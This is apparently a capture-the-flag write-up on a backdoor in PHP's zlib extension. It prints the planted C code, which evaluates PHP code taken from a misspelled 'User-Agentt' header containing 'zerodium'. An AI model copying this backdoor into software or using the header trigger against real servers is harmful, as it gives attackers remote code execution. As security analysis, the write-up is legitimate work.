## Source
A vulnerability was identified in a widely used product. Download the challenge attachment and review the code to identify it. 

## What is the technology affected? (5 points) 

```c
#include "php.h"
#include "SAPI.h"
#include "php_ini.h"
#include "ext/standard/info.h"
#include "ext/standard/php_string.h"
#include "php_zlib.h"
#include "zlib_arginfo.h"
#include "Zend/zend_interfaces.h"
```
## Based on the list of vulnerability categories in the challenge scenario, which one describes the identified vulnerability? (5 points) 
zend_eval_string() is called with our malicious payload contained in the Z_STRVAL_P() as an argument. This eval fucntion basically calls zend engine api which allows executing php code unrestrictedly.
```bash
if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL      ("_SERVER"))) && (enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
	convert_to_string(enc);
	if (strstr(Z_STRVAL_P(enc), "zerodium")) {
		zend_try {
			zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
		} zend_end_try();
	}
}
```
